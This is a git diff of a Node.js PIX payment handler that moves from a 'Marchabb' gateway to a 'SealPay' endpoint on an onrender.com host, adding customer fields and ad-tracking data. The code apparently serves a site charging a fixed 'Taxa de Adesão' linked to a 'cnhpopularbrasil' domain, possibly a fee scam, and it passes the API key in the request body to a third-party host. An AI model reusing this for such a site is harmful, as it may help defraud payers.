@@ -1,7 +1,7 @@
-// Marchabb API Integration v2.2
-// Pagamento via PIX com Marchabb Gateway
+// SealPay API Integration v1.0
+// Pagamento via PIX com SealPay Gateway
 
-const BASE_URL = "https://api.marchabb.com/v1";
+const BASE_URL = process.env.SEALPAY_BASE_URL || "https://abacate-5eo1.onrender.com";
 
 async function handlePaymentRequest(req, res) {
   // Handle OPTIONS
@@ -14,13 +14,12 @@ async function handlePaymentRequest(req, res) {
   }
 
   try {
-    const PUBLIC_KEY = process.env.MARCHABB_PUBLIC_KEY;
-    const SECRET_KEY = process.env.MARCHABB_SECRET_KEY;
-    
-    if (!PUBLIC_KEY || !SECRET_KEY) {
+    const API_KEY = process.env.SEALPAY_API_KEY;
+
+    if (!API_KEY) {
       return res.status(500).json({ 
         success: false, 
-        message: "Chaves da Marchabb não configuradas" 
+        message: "Chave da SealPay não configurada" 
       });
     }
 
@@ -30,81 +29,117 @@ async function handlePaymentRequest(req, res) {
       bodyData = JSON.parse(bodyData);
     }
 
-    const { cpf, nome, email, phone, amount, title } = bodyData;
+    const { cpf, nome, email, phone, amount, title, description } = bodyData;
+    const customerFromBody = bodyData.customer && typeof bodyData.customer === "object"
+      ? bodyData.customer
+      : null;
 
     console.log("[PAYMENT] Dados recebidos:", { cpf, nome, email, phone });
 
     // Validação
-    const validCpf = cpf?.toString().trim();
-    const validNome = nome?.toString().trim();
-    const validEmail = email?.toString().trim() || "cliente@cnhpopularbrasil.site";
-    const validPhone = phone?.toString().trim() || "11999999999";
+    const validCpf = (cpf ?? customerFromBody?.taxId)?.toString().trim();
+    const validNome = (nome ?? customerFromBody?.name)?.toString().trim();
+    const validEmail = (email ?? customerFromBody?.email)?.toString().trim();
+    const validPhone = (phone ?? customerFromBody?.cellphone)?.toString().trim();
 
-    if (!validCpf || !validNome) {
+    if (!validNome || !validEmail) {
       return res.status(400).json({
         success: false,
-        message: "CPF e Nome são obrigatórios",
+        message: "Nome e Email são obrigatórios",
       });
     }
 
     const FIXED_AMOUNT = amount || process.env.FIXED_AMOUNT || "64.73";
-    const FIXED_TITLE = title || "Taxa de Adesão";
+    const FIXED_TITLE = description || title || "Taxa de Adesão";
 
-    // Converter para centavos
-    const amountReais = Number(String(FIXED_AMOUNT).replace(",", "."));
-    const amountCents = Math.round(amountReais * 100);
+    const normalizeAmountToCents = (value) => {
+      if (value === undefined || value === null || value === "") {
+        const parsed = Number(String(FIXED_AMOUNT).replace(",", "."));
+        return Math.round(parsed * 100);
+      }
+      if (typeof value === "string" && (value.includes(",") || value.includes("."))) {
+        const parsed = Number(value.replace(",", "."));
+        return Math.round(parsed * 100);
+      }
+      const numeric = Number(value);
+      if (!Number.isFinite(numeric)) return 0;
+      if (!Number.isInteger(numeric)) {
+        return Math.round(numeric * 100);
+      }
+      // Heurística: valores pequenos (<= 1000) tratamos como reais
+      if (numeric <= 1000) return numeric * 100;
+      return numeric;
+    };
+
+    const amountCents = normalizeAmountToCents(amount);
+
+    if (!amountCents || amountCents < 100) {
+      return res.status(400).json({
+        success: false,
+        message: "Amount inválido (mínimo 100 centavos)",
+      });
+    }
+
+    const customer = {
+      name: customerFromBody?.name || validNome,
+      email: customerFromBody?.email || validEmail,
+      cellphone: (customerFromBody?.cellphone || validPhone || "").toString().replace(/\D/g, ""),
+      taxId: (customerFromBody?.taxId || validCpf || "").toString().replace(/\D/g, ""),
+    };
+
+    const trackingFromBody = bodyData.tracking;
+    const tracking = (() => {
+      if (trackingFromBody && typeof trackingFromBody === "object" && !Array.isArray(trackingFromBody)) {
+        const utm = typeof trackingFromBody.utm === "object" && trackingFromBody.utm ? trackingFromBody.utm : {};
+        const src = trackingFromBody.src || bodyData.src || req.headers.referer || "";
+        return { utm, src };
+      }
+      if (typeof trackingFromBody === "string") {
+        return { utm: {}, src: trackingFromBody };
+      }
+      const utm = typeof bodyData.utm === "object" && bodyData.utm ? bodyData.utm : {};
+      const src = bodyData.src || req.headers.referer || "";
+      return { utm, src };
+    })();
 
     const payload = {
       amount: amountCents,
-      currency: "BRL",
-      paymentMethod: "pix",
-      items: [
-        {
-          title: FIXED_TITLE,
-          unitPrice: amountCents,
-          quantity: 1,
-          tangible: false,
-        },
-      ],
-      customer: {
-        name: validNome,
-        email: validEmail,
-        phone: String(validPhone).replace(/\D/g, ""),
-        document: { 
-          number: String(validCpf).replace(/\D/g, ""), 
-          type: "cpf" 
-        },
-      },
-      pix: { expiresIn: 3600 },
-      externalRef: `order_${Date.now()}`,
+      description: FIXED_TITLE,
+      customer,
+      tracking,
+      api_key: API_KEY,
+      fbp: bodyData.fbp || "",
+      fbc: bodyData.fbc || "",
+      user_agent: bodyData.user_agent || req.headers["user-agent"] || "",
     };
 
-    // Auth
-    const auth = "Basic " + Buffer.from(PUBLIC_KEY + ":" + SECRET_KEY).toString("base64");
+    console.log("[PAYMENT] Enviando para SealPay...");
 
-    console.log("[PAYMENT] Enviando para Marchabb...");
-
-    const resp = await fetch(`${BASE_URL}/transactions`, {
+    const resp = await fetch(`${BASE_URL}/create-pix`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        "Authorization": auth,
       },
       body: JSON.stringify(payload),
     });
 
-    const data = await resp.json();
+    const data = await resp.json().catch(() => ({}));
 
     if (!resp.ok) {
-      console.error("[PAYMENT] Erro Marchabb:", resp.status, data);
+      console.error("[PAYMENT] Erro SealPay:", resp.status, data);
       return res.status(502).json({
         success: false,
-        message: "Falha ao criar PIX",
+        message: data?.error || "Falha ao criar PIX",
+        detalhes: data?.detalhes,
       });
     }
 
-    const tx = data?.id;
-    const pixText = data?.pix?.qrcode || data?.pix?.brCode || "";
+    const tx = data?.txid || data?.id;
+    const pixText = data?.pix_code || data?.pixCode || "";
+    const pixQr = data?.pix_qr_code || data?.pixQrCode || "";
+    const pixQrWithPrefix = pixQr && pixQr.startsWith("data:image")
+      ? pixQr
+      : (pixQr ? `data:image/png;base64,${pixQr}` : "");
 
     if (!tx || !pixText) {
       return res.status(502).json({
@@ -119,7 +154,8 @@ async function handlePaymentRequest(req, res) {
       pix_code: String(pixText),
       amount: data?.amount || amountCents,
       status: String(data?.status || "PENDING"),
-      qr_code: String(pixText),
+      qr_code: pixQrWithPrefix || String(pixText),
+      pix_qr_code: pixQrWithPrefix,
     });
 
   } catch (error) {
